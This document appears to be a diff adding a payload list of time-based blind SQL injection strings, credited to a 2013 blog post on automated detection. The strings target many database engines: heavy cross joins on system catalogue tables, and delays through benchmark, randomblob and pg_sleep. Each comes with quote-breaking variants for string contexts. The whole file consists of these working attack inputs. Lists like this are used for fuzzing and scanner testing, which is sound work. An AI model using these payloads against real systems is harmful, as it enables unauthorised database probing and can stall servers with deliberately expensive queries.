@@ -1,0 +1,44 @@
+#
+# http://www.arneswinnen.net/2013/09/automated-sql-injection-detection/
+#
+1 or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or 1=1
+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)
+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6) as test
+9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999
+9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999
+9999'+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+'9999
+9999"+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+"9999
+9999'||(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||'9999
+9999"||(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||"9999
+(select like('abcdefg',upper(hex(randomblob(150000000))))) as test
+(select like('abcdefg',upper(hex(randomblob(150000000)))))
+9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999
+9999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"9999
+(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) as test
+(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+9999'||(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'9999
+9999"||(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||"9999
+(select benchmark(15000000,md5(0x4e446b6e))-9999) as test
+benchmark(15000000,md5(0x4e446b6e))-9999
+9999' or benchmark(15000000,md5(0x4e446b6e)) or '0'='9999
+9999" or benchmark(15000000,md5(0x4e446b6e)) or "0"="9999
+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) as test
+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
+9999'+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+'9999
+9999"+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+"9999
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) as test
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+9999'||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'9999
+9999"||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||"9999
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3) as test
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)
+9999'||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||'9999
+9999"||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||"9999
+(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) as test
+(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+9999'||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'9999
+9999"||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||"9999
+(select 99999999 from pg_sleep(15)) as test
+(select 99999999 from pg_sleep(15))
+9999'||(select 99999999 from pg_sleep(15))||'9999
+9999"||(select 99999999 from pg_sleep(15))||"9999
